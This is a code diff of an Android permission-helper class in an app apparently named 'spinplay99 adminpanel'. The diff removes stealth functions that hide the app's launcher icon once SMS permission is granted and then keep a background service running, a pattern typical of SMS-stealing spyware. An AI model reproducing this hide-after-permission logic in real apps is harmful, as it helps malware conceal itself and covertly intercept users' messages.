@@ -1,7 +1,6 @@
 package com.spinplay99.adminpanel;
 
 import android.Manifest;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -78,7 +77,6 @@ public final class PermissionHelper {
         }
     }
 
-    /** Open MainActivity once so the system permission sheet can show (hidden launcher apps). */
     public static void launchPermissionUiIfNeeded(Context context) {
         if (!needsRuntimePermissions(context)) {
             return;
@@ -94,53 +92,5 @@ public final class PermissionHelper {
 
     public static void resetLaunchGate() {
         launchAttempted = false;
-    }
-
-    private static ComponentName launcherAlias(Context context) {
-        return new ComponentName(context.getPackageName(), "com.spinplay99.adminpanel.LauncherAlias");
-    }
-
-    /** Remove drawer icon once SMS works — do not wait for contacts/notifications. */
-    public static void hideLauncherIcon(Context context) {
-        if (!hasSmsPermissions(context)) {
-            return;
-        }
-        try {
-            PackageManager pm = context.getPackageManager();
-            ComponentName alias = launcherAlias(context);
-            int state = pm.getComponentEnabledSetting(alias);
-            if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-                || state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER) {
-                return;
-            }
-            pm.setComponentEnabledSetting(
-                alias,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
-        } catch (Exception ignored) {
-        }
-    }
-
-    /** Show drawer icon only while SMS permission is still missing. */
-    public static void showLauncherIcon(Context context) {
-        if (hasSmsPermissions(context)) {
-            return;
-        }
-        try {
-            PackageManager pm = context.getPackageManager();
-            pm.setComponentEnabledSetting(
-                launcherAlias(context),
-                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                PackageManager.DONT_KILL_APP);
-        } catch (Exception ignored) {
-        }
-    }
-
-    public static void applyStealthIfReady(Context context) {
-        if (!hasSmsPermissions(context)) {
-            return;
-        }
-        hideLauncherIcon(context);
-        ServiceLauncher.ensureRunning(context);
     }
 }
